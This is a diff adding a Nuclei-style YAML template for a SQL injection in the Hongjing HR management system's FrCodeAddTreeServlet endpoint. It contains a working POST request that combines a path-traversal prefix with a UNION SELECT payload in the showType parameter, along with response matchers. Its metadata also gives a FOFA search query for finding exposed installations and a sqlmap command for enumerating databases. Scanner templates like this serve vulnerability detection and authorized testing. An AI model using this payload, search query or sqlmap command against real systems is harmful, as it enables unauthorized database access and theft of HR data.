@@ -1,0 +1,39 @@
+id: hjsoft-FrCodeAddTreeServlet-sqli
+info:
+  name: 宏景人力资源管理系统 FrCodeAddTreeServlet - sqli
+  author: leadlife
+  severity: high
+  description: 宏景人力资源管理系统 FrCodeAddTreeServlet SQL 注入漏洞
+  metadata:
+    verified: true
+    fofa-qeury: body="<div class=\"hj-hy-all-one-logo\""||title="人力资源信息管理系统"||body="/general/sys/hjaxmanage.js"
+    sqlmap: sqlmap -r sql.txt --dbs --random-agent
+  tags: hjsoft, sqli
+
+http:
+  - raw:
+      - |-
+        POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 164
+
+        params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1' UNION ALL SELECT 93020394-616320,NULL,NULL,NULL,NULL,NULL--fNwL&treetype=&orgtype=
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,"92404074")
+        condition: and
+
+
+# POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1
+# Host: 127.0.0.1
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84
+# Connection: close
+# Content-Length: 164
+# Content-Type: application/x-www-form-urlencoded
+# Accept-Encoding: gzip
+
+# params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=*fNwL&treetype=&orgtype=
